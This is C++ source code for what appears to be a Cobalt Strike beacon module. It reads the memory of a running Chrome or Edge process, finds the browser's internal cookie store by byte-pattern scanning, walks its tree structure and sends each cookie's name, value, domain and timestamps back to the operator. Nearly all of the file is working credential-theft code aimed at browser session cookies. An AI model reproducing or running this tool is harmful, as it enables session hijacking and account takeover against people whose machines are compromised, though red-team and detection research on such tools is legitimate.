
extern "C" {
#include <cstdint>
#include "..\DFR.h"
#include "../beacon.h"

    struct OptimizedString {
        char buf[23];
        UCHAR len;
    };

    struct RemoteString {
        uintptr_t dataAddress;
        size_t strLen; //This won't include the null terminator
        int strMax; //Maximum string length
        char unk[3]; //I just couldn't figure out the last data type :(
        UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
    };

#pragma region Chrome
    enum class CookieSameSite {
        UNSPECIFIED = -1,
        NO_RESTRICTION = 0,
        LAX_MODE = 1,
        STRICT_MODE = 2,
        // Reserved 3 (was EXTENDED_MODE), next number is 4.

        // Keep last, used for histograms.
        kMaxValue = STRICT_MODE
    };

    enum class CookieSourceScheme {
        kUnset = 0,
        kNonSecure = 1,
        kSecure = 2,

        kMaxValue = kSecure  // Keep as the last value.
    };

    enum CookiePriority {
        COOKIE_PRIORITY_LOW = 0,
        COOKIE_PRIORITY_MEDIUM = 1,
        COOKIE_PRIORITY_HIGH = 2,
        COOKIE_PRIORITY_DEFAULT = COOKIE_PRIORITY_MEDIUM
    };

    enum class CookieSourceType {
        // 'unknown' is used for tests or cookies set before this field was added.
        kUnknown = 0,
        // 'http' is used for cookies set via HTTP Response Headers.
        kHTTP = 1,
        // 'script' is used for cookies set via document.cookie.
        kScript = 2,
        // 'other' is used for cookies set via browser login, iOS, WebView APIs,
        // Extension APIs, or DevTools.
        kOther = 3,

        kMaxValue = kOther,  // Keep as the last value.
    };

    //There is now additional cookie type "CookieBase", but I'm not going to add that here yet
    struct CanonicalCookieChrome {
        uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
        OptimizedString name;
        OptimizedString domain;
        OptimizedString path;
        int64_t creation_date;
        bool secure;
        bool httponly;
        CookieSameSite same_site;
        char partition_key[128];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
        CookieSourceScheme source_scheme;
        int source_port;    //Not implemented //End of Net::CookieBase
        OptimizedString value;
        int64_t expiry_date;
        int64_t last_access_date;
        int64_t last_update_date;
        CookiePriority priority;       //Not implemented
        CookieSourceType source_type;    //Not implemented
    };

#pragma endregion

#pragma region Edge
    struct CanonicalCookieEdge {
        uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
        OptimizedString name;
        OptimizedString domain;
        OptimizedString path;
        int64_t creation_date;
        bool secure;
        bool httponly;
        CookieSameSite same_site;
        char partition_key[136];  //Not implemented
        CookieSourceScheme source_scheme;
        int source_port;    //Not implemented //End of Net::CookieBase
        OptimizedString value;
        int64_t expiry_date;
        int64_t last_access_date;
        int64_t last_update_date;
        CookiePriority priority;       //Not implemented
        CookieSourceType source_type;    //Not implemented
    };
#pragma endregion


    struct Node {
        uintptr_t left;
        uintptr_t right;
        uintptr_t parent;
        bool is_black; //My guess is that data is stored in red-black tree
        char padding[7];
        OptimizedString key;
        uintptr_t valueAddress;
    };

    struct RootNode {
        uintptr_t beginNode;
        uintptr_t firstNode;
        size_t size;
    };

    void ReadString(HANDLE hProcess, OptimizedString string, formatp* buffer) {

        if (string.len > 23) //This is the max size of Short String Optimization (To my knowledge)
        {
            RemoteString longString = { 0 };
            memcpy(&longString, &string.buf, sizeof(RemoteString));

            if (longString.dataAddress != 0) {
#ifdef _DEBUG
                BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
                unsigned char* buf = (unsigned char*)malloc(longString.strMax);
                if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie value! Error: %i\n", GetLastError());
                    free(buf);
                    return;
                }
                BeaconFormatPrintf(buffer, "%s\n", buf);
                free(buf);
            }
        }
        else
            BeaconFormatPrintf(buffer, "%s\n", string.buf);

    }

    void PrintTimeStamp(int64_t timeStamp, formatp* buffer) {
        ULONGLONG fileTimeTicks = timeStamp * 10;

        FILETIME fileTime;
        fileTime.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
        fileTime.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);

        SYSTEMTIME systemTime;
        FileTimeToSystemTime(&fileTime, &systemTime);

        BeaconFormatPrintf(buffer, "%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
            systemTime.wYear, systemTime.wDay, systemTime.wMonth,
            systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
    }

    void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess, formatp* buffer) {
        BeaconFormatPrintf(buffer, "    Name: ");
        ReadString(hProcess, cookie.name, buffer);
        BeaconFormatPrintf(buffer, "    Value: ");
        ReadString(hProcess, cookie.value, buffer);
        BeaconFormatPrintf(buffer, "    Domain: ");
        ReadString(hProcess, cookie.domain, buffer);
        BeaconFormatPrintf(buffer, "    Path: ");
        ReadString(hProcess, cookie.path, buffer);
        BeaconFormatPrintf(buffer, "    Creation time: ");
        PrintTimeStamp(cookie.creation_date, buffer);
        BeaconFormatPrintf(buffer, "    Expiration time: ");
        PrintTimeStamp(cookie.expiry_date, buffer);
        BeaconFormatPrintf(buffer, "    Last accessed: ");
        PrintTimeStamp(cookie.last_access_date, buffer);
        BeaconFormatPrintf(buffer, "    Last updated: ");
        PrintTimeStamp(cookie.last_update_date, buffer);
        BeaconFormatPrintf(buffer, "    Secure: %s\n", cookie.secure ? "True" : "False");
        BeaconFormatPrintf(buffer, "    HttpOnly: %s", cookie.httponly ? "True" : "False");
    }

    void PrintValuesChrome(CanonicalCookieChrome cookie, HANDLE hProcess, formatp* buffer) {
        BeaconFormatPrintf(buffer, "    Name: ");
        ReadString(hProcess, cookie.name, buffer);
        BeaconFormatPrintf(buffer, "    Value: ");
        ReadString(hProcess, cookie.value, buffer);
        BeaconFormatPrintf(buffer, "    Domain: ");
        ReadString(hProcess, cookie.domain, buffer);
        BeaconFormatPrintf(buffer, "    Path: ");
        ReadString(hProcess, cookie.path, buffer);
        BeaconFormatPrintf(buffer, "    Creation time: ");
        PrintTimeStamp(cookie.creation_date, buffer);
        BeaconFormatPrintf(buffer, "    Expiration time: ");
        PrintTimeStamp(cookie.expiry_date, buffer);
        BeaconFormatPrintf(buffer, "    Last accessed: ");
        PrintTimeStamp(cookie.last_access_date, buffer);
        BeaconFormatPrintf(buffer, "    Last updated: ");
        PrintTimeStamp(cookie.last_update_date, buffer);
        BeaconFormatPrintf(buffer, "    Secure: %s\n", cookie.secure ? "True" : "False");
        BeaconFormatPrintf(buffer, "    HttpOnly: %s", cookie.httponly ? "True" : "False");
    }

    void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, formatp* buffer, bool isChrome) {

        if (isChrome)
        {
            CanonicalCookieChrome cookie = { 0 };
            if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome), nullptr)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie struct! Error: %i\n", GetLastError());
                return;
            }
            PrintValuesChrome(cookie, hProcess, buffer);
        }
        else {
            CanonicalCookieEdge cookie = { 0 };
            if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie struct! Error: %i\n", GetLastError());
                return;
            }
            PrintValuesEdge(cookie, hProcess, buffer);
        }
    }

    void ProcessNode(HANDLE hProcess, const Node& node, formatp* buffer, int *bufsize, bool isChrome) {
        BeaconFormatReset(buffer);
        BeaconFormatPrintf(buffer, "Cookie Key: ");
        ReadString(hProcess, node.key, buffer);

#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
#endif
        ProcessNodeValue(hProcess, node.valueAddress, buffer, isChrome);
        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(buffer, bufsize), *bufsize);

        //Process the left child if it exists
        if (node.left != 0) {
            Node leftNode;
            if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
                ProcessNode(hProcess, leftNode, buffer, bufsize, isChrome);
            else
                BeaconPrintf(CALLBACK_ERROR, "Error reading left node! Error: %i\n", GetLastError());
        }

        //Process the right child if it exists
        if (node.right != 0) {
            Node rightNode;
            if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
                ProcessNode(hProcess, rightNode, buffer, bufsize, isChrome);
            else
                BeaconPrintf(CALLBACK_ERROR, "Error reading right node! Error: %i\n", GetLastError());
        }
    }

    void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, bool isChrome) {

        RootNode cookieMap;
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to read the root node from given address! Error: %i\n", GetLastError());
            return;
        }

        // Process the root node
#ifdef _DEBUG
        BeaconPrintf(CALLBACK_OUTPUT, "Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
        BeaconPrintf(CALLBACK_OUTPUT, "Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
        BeaconPrintf(CALLBACK_OUTPUT, "Size of the cookie map: %Iu\n", cookieMap.size);
#endif

        if (cookieMap.firstNode == 0) //CookieMap was empty
        {
            BeaconPrintf(CALLBACK_OUTPUT, "This CookieMap was empty\n");
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Number of available cookies: %Iu\n", cookieMap.size);
        // Process the first node of the binary search tree
        Node firstNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr) {
            formatp buffer;
            int bufsize = 5 * 1024;
            BeaconFormatAlloc(&buffer, bufsize); // RFC 6265 specifies: "At least 4096 bytes per cookie"
            ProcessNode(hProcess, firstNode, &buffer, &bufsize, isChrome);
            BeaconFormatFree(&buffer);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Error reading first node! Error: %i\n", GetLastError());
        }
    }

    BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {

        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);

        uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
        uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);

        MEMORY_BASIC_INFORMATION memoryInfo;

        int hitcount = 0;
        while (startAddress < endAddress) {
            if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
                if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE)) != 0) {
                    BYTE* buffer = (BYTE*)malloc(memoryInfo.RegionSize);
                    SIZE_T bytesRead;

                    if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                        for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                            if (memcmp(buffer + i, pattern, patternSize) == 0) {
                                uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                                uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
#ifdef _DEBUG
                                BeaconPrintf(CALLBACK_OUTPUT, "Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
                                    memoryInfo.AllocationBase,
                                    memoryInfo.BaseAddress,
                                    offset);
#endif
                                cookieMonsterInstances[szCookieMonster] = resultAddress;
                                szCookieMonster++;
                            }
                        }
                    }
                    else {
                        //This happens quite a lot, will not print these errors on release build
#ifdef _DEBUG
                        BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed! Error: %i\n", GetLastError());
#endif
                    }

                    free(buffer);
                }

                startAddress += memoryInfo.RegionSize;
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "VirtualQueryEx failed! Error: %i\n", GetLastError());
                break;
            }
        }
        if (szCookieMonster > 0)
            return TRUE;
        return FALSE;
    }

    //This is here to allow wildcard matching
    BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {

        for (size_t i = 0; i < num; ++i) {
            if (searchPattern[i] == 0xAA)
                continue;
            if (source[i] != searchPattern[i]) {
                return FALSE;
            }
        }

        return TRUE;
    }

    BOOL FindDllPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t moduleAddr, DWORD moduleSize, uintptr_t& resultAddress)
    {
        BYTE* buffer = (BYTE*)malloc(moduleSize);
        SIZE_T bytesRead;

        BOOL result = ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(moduleAddr), buffer, moduleSize, &bytesRead);
        DWORD error = GetLastError();

        if (result || error == 299) { //It is fine if not all was read
            for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                if (MyMemCmp(buffer + i, pattern, patternSize)) {
                    resultAddress = moduleAddr + i;
                    free(buffer);
                    return TRUE;
                }
            }
        }
        else {
            //This happens quite a lot, will not print these errors on release build
#ifdef _DEBUG
            BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed! Error: %i\n", GetLastError());
#endif
        }
        free(buffer);
        return FALSE;
    }
}